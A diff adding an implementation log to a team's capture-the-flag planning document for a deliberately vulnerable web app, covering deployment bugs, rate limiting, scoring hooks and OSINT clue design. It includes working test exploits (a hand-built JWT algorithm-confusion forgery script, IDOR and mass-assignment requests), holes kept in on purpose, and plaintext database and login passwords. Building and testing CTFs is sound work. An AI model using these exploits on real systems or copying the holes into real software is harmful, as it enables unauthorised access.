@@ -2561,5 +2561,284 @@ WEEK 3  ────────────────────────
 
 ---
 
+## 23. Implementation Log — Deployment, Debugging & OSINT Narrative Design (Member 2)
+
+> [!info] Purpose of This Section
+> Everything below reflects actual work done on the live CTF-PAM and CTF-MySQL EC2 instances after Phase 1–2 were nominally "complete" per the plan above. It captures real bugs hit during deployment (most of which are not obvious from the code alone), the operational/monitoring layer built on top of the vulnerabilities, and the OSINT discovery-chain design that determines whether players can actually *find* the vulnerabilities without being told directly. Treat this as the living addendum to Sections 10–11 and 17.
+
+### 23.1 Current Verified State (as of this session)
+
+**All four core vulnerabilities are deployed AND confirmed working via live testing** — not just code-reviewed, actually exploited end-to-end against `pam-ctf.duckdns.org`:
+
+| Vulnerability | Test performed | Result |
+|---|---|---|
+| JWKS endpoint | `curl -s https://pam-ctf.duckdns.org/.well-known/jwks.json` | ✅ Valid RSA public key (JWK format) returned |
+| JWT algorithm confusion | Hand-built HS256 JWT (bypassing pyjwt's key-type guard, see 23.3) signed with raw public-key-PEM bytes as HMAC secret, sent to `/api/assets` | ✅ `200 OK` — forged ADMIN token accepted, MySQL asset returned |
+| IDOR on audit sessions | OPERATOR token used against `/api/audit/sessions/user/<admin-uuid>` | ✅ `200 OK` with `sessions: []` (not `403`) — confirms no ownership check |
+| Mass assignment | `POST /api/register` with `clearanceCode: "PROV-ROOT"` | ✅ Account created with `role: "ADMIN"` in the resulting JWT |
+
+Full attack chain (Stage 1 → Stage 4, including SSH tunnel into MySQL and flag-table access) is operational end-to-end.
+
+**Nginx rate limiting** — deployed and confirmed functioning on `/api/auth/login`, `/api/register`, and `/api/` (general). Fixed a real deployment bug (see 23.2) where the rules were initially inert.
+
+**Concurrent tunnel cap** (`MAX_CONCURRENT_TUNNELS = 8`) — added to `server.ts`, requires `activeCount()` exposed from `tunnel.service.ts` (added, exports `tunnels.size`).
+
+**Milestone/audit system** (`lib/ctf-audit.ts`) — built and wired into login (`recon_first_login`). Discord webhook integration confirmed functional via direct curl test. Idempotent per `(email, type)` pair so repeated actions don't spam Discord or the DB.
+
+### 23.2 Real Bugs Hit During Deployment (Root Causes)
+
+These are documented because several of them are non-obvious and will likely recur if the stack is redeployed or another CTF fork is built from this codebase.
+
+**1. `docker compose down -v` silently reverts manual DB fixes**
+Running a manual `UPDATE target_assets SET hostname = ...` in `psql` works until the next `down -v`, which wipes the Postgres volume and reinitializes from `docker/postgres/seed.sql` — reintroducing the stale production IP (`172.31.21.46`). **Fix discipline:** any DB value that needs to persist must be edited directly in `seed.sql`, not patched live in psql. Standard rebuild cycle (no `-v`) is `docker compose up -d` → `docker compose exec app npx next build` → `docker compose restart app`.
+
+**2. Nginx `location` blocks pasted into the wrong `server{}` block are silently dead**
+Certbot's auto-managed config creates two `server{}` blocks: one for port 443 (real traffic) and one for port 80 that either 301-redirects to HTTPS or returns 404. Rate-limit `location` blocks pasted into the port-80 block never execute, because the `if ($host = ...) return 301 ...;` directive fires in nginx's rewrite phase — before location matching — for any matching hostname. All three rate-limited paths must live in the **443 `server{}` block**, alongside the existing `location = /.well-known/jwks.json` and `location /`.
+
+**3. `limit_req_zone` duplicate declaration breaks `nginx -t`**
+`limit_req_zone` must be declared exactly once, in the top-level `http{}` block (`/etc/nginx/nginx.conf`), never inside a per-site `server{}` block. A duplicate zone name (e.g., `ctf_api` declared twice) fails config test with `"...already bound to key..."`. Always `grep -rn "limit_req_zone" /etc/nginx/` across `nginx.conf` and `sites-available/*` to spot duplicates before debugging further.
+
+**4. SSH key added to the wrong OS account**
+`ssh-keygen` + `cat key.pub >> ~/.ssh/authorized_keys` run as `ubuntu` only authorizes the key for the `ubuntu` account. If `seed-vault.ts` specifies `username: 'pamuser'`, the SSH handshake fails ("All configured authentication methods failed") because the key was never added to *pamuser's* `authorized_keys`. Fix: `sudo mkdir -p /home/pamuser/.ssh && sudo cp key.pub /home/pamuser/.ssh/authorized_keys`, then `chown -R pamuser:pamuser` and correct permissions (`700`/`600`). A password prompt appearing during a key-auth SSH attempt is a strong signal the key isn't authorized for that account and SSH is silently falling back to password auth.
+
+**5. `pamshell.sh` quoting bug: `-p 1234Admin` vs `-p'1234Admin'`**
+A space between `-p` and the password causes the MySQL client to interpret `-p` as "prompt interactively" and the following word (`1234Admin`) as a **database name** argument — producing a confusing `Access denied ... to database '1234Admin'` error that has nothing to do with the actual password being wrong. MySQL's `-p` flag requires the password glued directly to it with no space: `-p'1234Admin'`.
+
+**6. Double-launch of MySQL client caused literal credentials to appear in the terminal**
+Original design had `tunnel.service.ts` sending `mysql -u ... -p'...'` as a scripted command *and* `pamshell.sh` also auto-launching MySQL on login — the second command got typed as literal text into an already-open `mysql>` prompt, visibly leaking the command (including password) to anyone reading the terminal buffer/replay. **Fix:** pick one login path only. Final design: `pamshell.sh` is the sole place MySQL gets launched; `tunnel.service.ts`'s `mysql` branch now just sets `entry.ready = true` without sending any command.
+
+**7. `stty -echo` applied to a shell already mid-session caused a stuck/broken terminal**
+Attempting to suppress command echo (mirroring the MongoDB branch's pattern) around a `mysql -p'...'` command that is passed as a CLI argument (not typed interactively) is unnecessary — there's no interactive prompt to hide — and left the PTY in a broken input state. Removed entirely; a fresh session (`stty sane` or simply reconnecting) resolves the frozen state.
+
+**8. `exit` inside the MySQL shell dropped players into a full bash shell**
+Once `pamuser`'s login shell was set to plain `/bin/bash` (to fix bug #6/#7's double-launch issue), typing `exit` inside `mysql>` just returned to the underlying interactive bash session — giving players full OS-level shell access on the MySQL box, well outside CTF scope. **Final fix:** `pamuser`'s login shell is `/usr/local/bin/pamshell.sh`, which runs MySQL as the *only* command in the script; when MySQL exits (via `exit`, `quit`, `\q`, Ctrl-D), the script falls through immediately to `exit 0` — since this **is** the login shell itself, that terminates the SSH session entirely rather than dropping to any further prompt. There is no bash underneath to escape into.
+
+**Current `pamshell.sh`:**
+```bash
+#!/bin/bash
+mysql -u pamuser -p'1234Admin' --prompt="mysql> "
+echo "Session ended."
+exit 0
+```
+
+**Current relevant fragment of `tunnel.service.ts`'s command-dispatch block:**
+```typescript
+if (db_type === 'mysql' && creds.db) {
+    entry.ready = true
+    entry.buffer = []
+} else if (db_type === 'mongodb' && creds.db) {
+    const { username: dbUser, password: dbPass } = creds.db
+    stream.write(`stty -echo; mongosh -u ${dbUser} -p '${dbPass}' --authenticationDatabase admin; stty echo\r`)
+    entry.commandSent = true
+    ;(creds.db as any).password = ''
+} else {
+    entry.ready  = true
+    entry.buffer = []
+}
+connectConfig.privateKey = ''
+```
+
+**9. `jwt.encode()` in newer pyjwt refuses PEM-shaped keys as HMAC secrets, even when passed as raw bytes**
+pyjwt's `algorithms.py` inspects key *content* (not just type) and raises `InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret` — even when the PEM string is `.encode()`d to bytes first. This blocks the most natural way to test the algorithm-confusion attack. **Workaround for testing:** bypass pyjwt's `encode()` entirely and hand-construct the JWT per spec using Python's `hmac`/`hashlib`/`base64` modules directly (header + payload base64url-encoded, HMAC-SHA256 signature over `header.payload` using the raw public-key-PEM bytes as the secret key, base64url-encoded). This is a testing-tooling quirk only — it does not affect the actual server-side vulnerability, which has no such restriction (confirmed: forged tokens built this way are accepted by the live server).
+
+**10. Missing import broke login route after adding brute-force lockout**
+`app/api/auth/login/route.ts` referenced `redis.incr(...)` without importing `redis` from `@/lib/redis`, and never called `recordMilestone` despite `lib/ctf-audit.ts` already existing. Both were required for the route to compile/function correctly — added `import { redis } from "@/lib/redis"`, `import { recordMilestone } from "@/lib/ctf-audit"`, a `setImmediate(() => recordMilestone(user.email, "recon_first_login")...)` call after successful password verification, and `await redis.del(attemptsKey)` on success to reset the lockout counter.
+
+### 23.3 Testing Methodology Reference
+
+For re-verifying any of the four vulnerabilities after redeployment, the following commands are the confirmed-working test sequence (run from CTF-PAM EC2 or any box with network access to the public endpoint):
+
+```bash
+# JWKS
+curl -s https://pam-ctf.duckdns.org/.well-known/jwks.json | python3 -m json.tool
+
+# Legit login (baseline)
+TOKEN=$(curl -s -X POST https://pam-ctf.duckdns.org/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"operator@securegate.local","password":"Operator1234!"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['accessToken'])")
+
+# Algorithm confusion (hand-built JWT, bypasses pyjwt's key-type guard — see bug #9 above)
+python3 << 'EOF'
+import hmac, hashlib, base64, json, requests
+
+def b64url(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+public_key_pem = """-----BEGIN PUBLIC KEY-----
+<paste GUARDIAN_JWT_PUBLIC_KEY exact contents here>
+-----END PUBLIC KEY-----
+"""
+
+header = {"alg": "HS256", "typ": "JWT"}
+payload = {"userId": "forged", "role": "ADMIN", "email": "attacker@evil.com"}
+header_b64 = b64url(json.dumps(header, separators=(',', ':')).encode())
+payload_b64 = b64url(json.dumps(payload, separators=(',', ':')).encode())
+signing_input = f"{header_b64}.{payload_b64}".encode()
+secret = public_key_pem.encode('utf-8')
+signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
+forged = f"{header_b64}.{payload_b64}.{b64url(signature)}"
+
+res = requests.get('https://pam-ctf.duckdns.org/api/assets', headers={"Authorization": f"Bearer {forged}"})
+print("Status:", res.status_code)
+print("Body:", res.json())
+EOF
+
+# IDOR — requires a real UUID from the users table, NOT a placeholder
+docker compose exec postgres psql -U admin -d securegate -c "SELECT id, email FROM users;"
+curl -s "https://pam-ctf.duckdns.org/api/audit/sessions/user/<real-uuid>" \
+  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
+
+# Mass assignment
+curl -s -X POST https://pam-ctf.duckdns.org/api/register \
+  -H "Content-Type: application/json" \
+  -d '{"email":"masstest@evil.com","password":"p@ssw0rd123","clearanceCode":"PROV-ROOT"}'
+```
+
+> [!warning] Test Account Cleanup
+> Any test account created during verification (e.g. `masstest@evil.com`) must be deleted from Postgres before the event, and any corresponding `login_attempts:*` Redis keys and `ctf_milestones` Mongo documents cleared, so testing artifacts don't pollute the real leaderboard or player data.
+> ```sql
+> DELETE FROM user_roles WHERE user_id = (SELECT id FROM users WHERE email='masstest@evil.com');
+> DELETE FROM users WHERE email='masstest@evil.com';
+> ```
+
+### 23.4 Operational Layer — Audit, Discord & Rate Limiting (New, Beyond Original Plan)
+
+The original plan (Sections 15, 18, 21) described score detection conceptually. This session implemented the actual mechanism:
+
+**`lib/ctf-audit.ts`** — centralized milestone recorder, one function called from every stage of the attack chain:
+
+```typescript
+export type MilestoneType =
+  | "recon_first_login"
+  | "privilege_escalation"
+  | "session_requested"
+  | "mysql_session_opened"
+  | "flag_submitted";
+
+export async function recordMilestone(
+  email: string,
+  type: MilestoneType,
+  meta: Record<string, unknown> = {},
+) {
+  // idempotent per (email, type) — writes to Mongo `ctf_milestones`, pings Discord
+}
+```
+
+**Wiring status by milestone:**
+
+| Milestone | Wired in | Status |
+|---|---|---|
+| `recon_first_login` | `app/api/auth/login/route.ts`, after password check succeeds | ✅ Done |
+| `privilege_escalation` | `lib/rbac.ts`, `requireRole` — compare JWT-claimed role vs actual Postgres role for that `userId` | ⏳ Designed, not yet implemented. Catches **both** intended Stage 2 paths (forged token OR mass-assignment-created real ADMIN) via the same signature: JWT claims ADMIN, Postgres user_roles disagrees (or newly agrees, for the mass-assignment case) |
+| `session_requested` | `app/api/sessions/request/route.ts`, after ticket issued | ⏳ Not yet wired |
+| `mysql_session_opened` | `server.ts`, after `tunnelService.openTunnel()` succeeds | ⏳ Blocked — `server.ts` only has `userId` at that point, not `email`. Requires passing `email` through the Redis ticket payload from `sessions/request/route.ts` (currently stores only `userId:assetId`) |
+| `flag_submitted` | `/api/ctf/submit` | ⏳ Blocked — route doesn't exist yet (see 23.6) |
+
+**Brute-force detection (as distinct from prevention):** rate limiting (nginx) and lockout (Redis counter in login route) prevent brute-force; nothing yet *logs* that a lockout occurred. Planned addition to `login/route.ts`:
+```typescript
+if (attempts > 8) {
+  setImmediate(() => notifyDiscord(`⚠️ Rate limit hit for ${email}`).catch(() => {}));
+  return NextResponse.json({ message: "Too many attempts, try again shortly" }, { status: 429 });
+}
+```
+
+**Nginx rate limiting — final working config** (all inside the 443 `server{}` block per bug #2 above):
+```nginx
+# in http{} block of nginx.conf (declared once):
+limit_req_zone $binary_remote_addr zone=ctf_auth:10m rate=10r/m;
+limit_req_zone $binary_remote_addr zone=ctf_api:10m rate=60r/m;
+
+# in the 443 server{} block of sites-available/pam-ctf:
+location /api/auth/login {
+    limit_req zone=ctf_auth burst=3 nodelay;
+    proxy_pass http://localhost:3000;
+    # ... proxy headers including X-Real-IP, X-Forwarded-For, X-Forwarded-Proto ...
+}
+location /api/register {
+    limit_req zone=ctf_auth burst=3 nodelay;
+    proxy_pass http://localhost:3000;
+    # ... same headers ...
+}
+location /api/ {
+    limit_req zone=ctf_api burst=15 nodelay;
+    proxy_pass http://localhost:3000;
+    # ... same headers, plus WebSocket upgrade headers, 3600s timeouts ...
+}
+```
+
+**Concurrent tunnel cap** — in `server.ts`, inside `handleConnection`, positioned after ticket validation but before `openTunnel()`:
+```typescript
+const MAX_CONCURRENT_TUNNELS = 8;
+if (tunnelService.activeCount() >= MAX_CONCURRENT_TUNNELS) {
+  socket.emit("error", { code: 5003, message: "Server at capacity, please retry shortly" });
+  socket.disconnect(true);
+  return;
+}
+```
+Requires `activeCount(): number { return tunnels.size }` added to the `tunnelService` object in `lib/vault/tunnel.service.ts`, and the same signature added to `ITunnelService` in `lib/shared/interfaces/vault.interface.ts` for type consistency.
+
+### 23.5 Infrastructure Cost Note (Instance Resizing for Event Day)
+
+No Kubernetes needed or planned — Docker Compose across 3-4 EC2 instances is the correct scale for a single-event CTF; k8s would add cluster-management overhead for zero benefit here.
+
+**Plan:** run t2.micro normally (cheap, always-on for dev/testing), resize to t2.small or t2.medium just before the event (stop instance → change instance type → start), downgrade back after. DuckDNS cron picks up the new public IP within ~5 minutes of boot — don't test immediately after a resize/restart or DNS may not have caught up yet.
+
+**Approximate on-demand cost, us-east-1** (verify current rates before the event):
+
+| Type | vCPU/RAM | 6 hrs | 12 hrs |
+|---|---|---|---|
+| t2.micro | 1/1GB | ~$0.07 | ~$0.14 |
+| t2.small | 1/2GB | ~$0.14 | ~$0.28 |
+| t2.medium | 2/4GB | ~$0.28 | ~$0.56 |
+| t2.large | 2/8GB | ~$0.56 | ~$1.11 |
+
+Negligible against the $100 credit budget even at t2.large. Recommendation: t2.medium for CTF-PAM specifically (extra RAM helps Next.js + concurrent SSH tunnels + audit buffer coexist under load); CTF-MySQL and Lore-Nginx can stay at t2.micro/small since they're much lighter.
+
+### 23.6 Still Outstanding
+
+- **`app/api/ctf/submit/route.ts`** and **`app/api/ctf/scores/route.ts`** — specified in Section 10, Step 6 of this plan, but not yet built. Blocks: flag verification, leaderboard scoring writes, first-blood Discord ping, and the `flag_submitted` milestone. This is the highest-priority remaining backend work — nothing scoring-related functions without it.
+- **`privilege_escalation`, `session_requested`, `mysql_session_opened` milestones** — designed (23.4) but not wired in.
+- **Admin UUID plant in `seed.sql`** — still not implemented (see 23.7, this is now load-bearing for the IDOR path to have a payoff, not just cosmetic).
+- **OSINT documents** (provisioning runbook, leak page) — not yet written (see 23.7).
+- **`ITunnelService` interface update** — add `activeCount(): number` signature to match the implementation in `tunnel.service.ts`.
+
+### 23.7 OSINT Discovery-Chain Design (New Session Discussion)
+
+> [!important] Design Principle Established This Session
+> A vulnerability that only works when the tester already has the exact curl command isn't a real CTF stage — it's a scripted demo. Verified-working code is necessary but not sufficient; the **discovery path** to that code must also be realistic for a player with no inside knowledge. This section documents where the current discovery chain has real gaps (not hypothetical ones) and the design worked out to close them.
+
+**Core rule for all hints in this design:** never hint at the *technique* — hint at a *location or identifier*. Players supply the technique themselves once they have the identifier; the system's own behavior (once they arrive) teaches them the rest. Over-explaining ("try HS256/RS256 confusion") defeats the purpose — the clue should reward recognition, not deliver a lesson.
+
+**Stage-by-stage discoverability audit:**
+
+**Stage 1 (Recon)** — sound as designed. `gobuster`/`ffuf` against the live domain should surface `/.well-known/jwks.json` since it's a standard convention likely present in common wordlists (dirb/SecLists) — but this must be manually verified against the actual live box before the event, not assumed. `X-Powered-By: Next.js` header leak should also be confirmed still present (Nginx or Next.js may be stripping it silently).
+
+**Stage 2, Path A (JWT algorithm confusion)** — the vulnerability is real and confirmed (23.1), but there is currently **no hint at all** pointing a player toward attempting this specific attack class. A player who finds `jwks.json` via gobuster sees "a public key exists" — nothing signals "this server might also accept HS256." This is intentionally the high-skill path (rewards players who already recognize JWKS + dual-algorithm-support as a known anti-pattern from prior training), and doesn't strictly need a hint — but if one is wanted, the correct form is a **plausible engineering-blog-style detail**, not a security warning: e.g., a fake "APT Solutions Engineering Blog" post mentioning "we support both RS256 and HS256 for backward compatibility during our JWT migration" — stated as a mundane implementation note, meaningful only to someone who already half-knows the attack class.
+
+**Stage 2, Path B (IDOR)** — mechanically confirmed working, but currently a **dead end** for players who find it. The endpoint returns another user's session list, but without a way to know *which* UUID belongs to the admin, a player has confirmed a bug with no forward path. This is the parked "Admin UUID hardcoding in seed.sql for IDOR discoverability" item from the original plan — **it is not cosmetic, it is required** for this path to lead anywhere. Design worked out this session: split the admin UUID (`9df5cc64-7e12-4946-a757-f32e48c38f6a`, 5 segments) into 2-3 fragments, each embedded in a different artifact requiring a different discovery skill:
+  - One fragment in image alt-text or EXIF metadata on a photo posted to the lore page or a fake "employee directory"
+  - One fragment inside a fake internal Slack-export screenshot (see leak page below), shown mid-conversation as if someone pasted a userId while debugging
+  - Optionally, a third fragment behind a geolocation/geoguessr-style clue (identifiable building/location leads to a fake business listing containing the fragment)
+
+  This spreads the puzzle across distinct skills (metadata extraction, social-engineering a fake profile, geolocation) so different player strengths contribute partial progress, and no single fragment is a hard bottleneck. Document fragment locations in `ctf-ops/docs/attack-walkthrough.md` to avoid losing track internally.
+
+**Stage 3 (Mass assignment)** — `/api/register` is deliberately unlinked from the frontend but discoverable via API-focused fuzzing wordlists (`register` is a very common entry in wordlists like SecLists' `api-endpoints.txt`) — reasonably realistic to find. **The dead end is the field name.** The endpoint deliberately uses `clearanceCode` instead of `role` specifically to prevent trivial guessing — but without any OSINT trail revealing the mapping, a player who finds the endpoint has no way to know what field or values to send, short of blind-guessing common field names. **This is the second real gap**, same category as the IDOR issue: the vulnerability is real, but currently undiscoverable by design intent without the planned OSINT documents, which don't exist yet.
+
+**"Dark web" leak page mechanic** — resolved design question from this session: you don't hint at a dark-web-styled page by linking it (that defeats the "hidden" framing) — you host it yourself as a normal static page at a deliberately obscure path (e.g., `apt-lore.duckdns.org/leaks/x7Kq9dP2` or a distinct throwaway domain), and the hint is a **fragment or partial identifier**, not a link. Concretely: the fake Slack screenshot (same artifact used for the UUID fragment above) includes a visible-but-cropped mention like *"ugh, IT posted the whole onboarding doc to the leak mirror again"* with a partial paste-ID or URL fragment visible in a corner — enough for a player to reconstruct or search for the actual path, not enough to be a directory-listed clickable link.
+
+**Unifying structure — one narrative chain, not four disconnected puzzles:**
+
+Given the goal of a followable story (informed by an OSINT-background perspective on realistic investigative chains), the recommended structure links documents so finding one naturally leads toward the next, rather than presenting four separate lookup tables:
+
+1. **Public lore page** (entry point) — establishes APT Solutions and the general scenario; contains a subtle easter-egg reference to "recent internal drama," not further explained
+2. **A discoverable "leaked" internal blog post or memo** — findable via light OSINT (search-indexed, or linked from the lore-page easter egg) — casually mentions the JWT dual-algorithm detail (Stage 2A hint) *and* references "the incident with IT's onboarding docs leaking again" (pointer toward #3)
+3. **The fake Slack-export leak page** (found via the paste-ID/URL fragment referenced in #2) — contains: the `clearanceCode → role` mapping table (Stage 3 payoff), a UUID fragment (Stage 2B/IDOR payoff), and potentially an EXIF-embedded second UUID fragment in an attached image
+4. Player now has independently-recognized JWT hint (Path A, for players with prior knowledge), the mass-assignment field mapping (Stage 3), and enough UUID fragments to complete the IDOR path (Stage 2B) — all sourced from one coherent "investigation" rather than four separate isolated clues
+
+**Not yet drafted:** actual text/content for the fake engineering blog post, the Slack leak screenshot script/content, and the provisioning runbook document. This is the next concrete deliverable, intended to hand off to Member 1 for integration into the lore site.
+
+---
+
 *SecureGate_CTF_PLAN.md — Full Event Architecture, Vulnerability Design & Operations Reference*
 *Team eyes only — never commit to any public repository*
